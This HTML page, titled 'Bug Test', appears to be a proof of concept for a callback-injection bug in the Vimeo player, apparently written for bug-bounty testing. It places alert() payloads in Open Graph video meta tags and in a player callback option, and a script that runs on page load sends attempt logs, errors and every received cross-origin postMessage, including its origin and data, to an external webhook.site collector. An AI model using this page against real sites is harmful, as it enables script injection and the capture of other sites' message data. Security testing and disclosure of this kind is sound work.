<!DOCTYPE html>
<html>
<head>
    <meta property="og:site_name" content="Vimeo">
    <meta property="og:type" content="video.other">
    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213/config?callback=alert(1)">
    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213?callback=alert(document.domain)">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="NaN">
    <meta property="og:video:height" content="-1">
    <title>Bug Test</title>
    <script>
    async function attemptExploit() {
        try {
            // Load Vimeo player API
            const script = document.createElement('script');
            script.src = 'https://player.vimeo.com/api/player.js';
            script.onload = () => {
                const player = new Vimeo.Player('vimeo-player', {
                    url: 'https://player.vimeo.com/video/403530213',
                    callback: 'alert(1)'
                });
            };
            document.body.appendChild(script);

            // Log attempt
            fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'callback_injection_attempted',
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});

        } catch(e) {
            fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'error',
                    error: e.toString()
                })
            }).catch(() => {});
        }
    }

    window.onmessage = (e) => {
        fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
            method: 'POST',
            body: JSON.stringify({
                type: 'message',
                origin: e.origin,
                data: e.data
            })
        }).catch(() => {});
    };

    window.onload = attemptExploit;
    </script>
</head>
<body>
    <div id="vimeo-player"></div>
</body>
</html>
